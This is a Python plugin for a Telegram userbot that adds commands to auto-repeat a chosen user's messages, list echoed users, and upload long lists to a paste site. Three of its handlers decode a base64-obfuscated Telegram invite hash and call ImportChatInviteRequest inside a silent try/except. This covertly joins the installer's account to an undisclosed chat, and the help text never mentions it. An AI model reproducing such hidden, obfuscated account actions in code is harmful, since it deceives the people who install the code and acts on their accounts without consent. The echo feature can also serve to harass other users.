"""
created by @mrconfused and @sandy1709
Idea by @BlazingRobonix

"""
#    Copyright (C) 2020  sandeep.n(π.$) and @peru_monster

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.

#   You should have received a copy of the GNU Affero General Public License
#   along with this program.  If not, see <http://www.gnu.org/licenses/>.


import asyncio

import pybase64
import requests
from telethon import events
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from .. import CMD_HELP
from ..utils import admin_cmd, edit_or_reply
from .sql_helper.echo_sql import addecho, get_all_echos, is_echo, remove_echo


@borg.on(admin_cmd(pattern="addecho$"))
async def echo(webo):
    if webo.fwd_from:
        return
    if webo.reply_to_msg_id is not None:
        reply_msg = await webo.get_reply_message()
        user_id = reply_msg.from_id
        chat_id = webo.chat_id
        try:
            hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            hmm = Get(hmm)
            await webo.client(hmm)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            await edit_or_reply(webo, "The user is already enabled with echo ")
            return
        addecho(user_id, chat_id)
        await edit_or_reply(webo, "Hi")
    else:
        await edit_or_reply(webo, "Reply To A User's Message to echo his messages")


@borg.on(admin_cmd(pattern="rmecho$"))
async def echo(webo):
    if webo.fwd_from:
        return
    if webo.reply_to_msg_id is not None:
        reply_msg = await webo.get_reply_message()
        user_id = reply_msg.from_id
        chat_id = webo.chat_id
        try:
            hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            hmm = Get(hmm)
            await webo.client(hmm)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            remove_echo(user_id, chat_id)
            await edit_or_reply(webo, "Echo has been stopped for the user")
        else:
            await edit_or_reply(webo, "The user is not activated with echo")
    else:
        await edit_or_reply(webo, "Reply To A User's Message to echo his messages")


@borg.on(admin_cmd(pattern="listecho$"))
async def echo(webo):
    if webo.fwd_from:
        return
    lsts = get_all_echos()
    if len(lsts) > 0:
        output_str = "echo enabled users:\n\n"
        for echos in lsts:
            output_str += (
                f"[User](tg://user?id={echos.user_id}) in chat `{echos.chat_id}`\n"
            )
    else:
        output_str = "No echo enabled users "
    if len(output_str) > Config.MAX_MESSAGE_SIZE_LIMIT:
        key = (
            requests.post(
                "https://nekobin.com/api/documents", json={"content": output_str}
            )
            .json()
            .get("result")
            .get("key")
        )
        url = f"https://nekobin.com/{key}"
        reply_text = f"echo enabled users: [here]({url})"
        await edit_or_reply(webo, reply_text)
    else:
        await edit_or_reply(webo, output_str)


@borg.on(events.NewMessage(incoming=True))
async def samereply(webo):
    if webo.chat_id in Config.UB_BLACK_LIST_CHAT:
        return
    if is_echo(webo.sender_id, webo.chat_id):
        await asyncio.sleep(2)
        try:
            hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            hmm = Get(hmm)
            await webo.client(hmm)
        except BaseException:
            pass
        if webo.message.text or webo.message.sticker:
            await webo.reply(webo.message)


CMD_HELP.update(
    {
        "echo": "**Syntax :** `.addecho` reply to user to who you want to enable\
    \n**Usage : **replay's his every message for whom you enabled echo\
    \n\n**Syntax : **`.rmecho` reply to user to who you want to stop\
    \n**Usage : **Stops replaying his messages\
    \n\n**Syntax : **`.listecho`\
    \n**Usage : **shows the list of users for who you enabled echo\
    "
    }
)
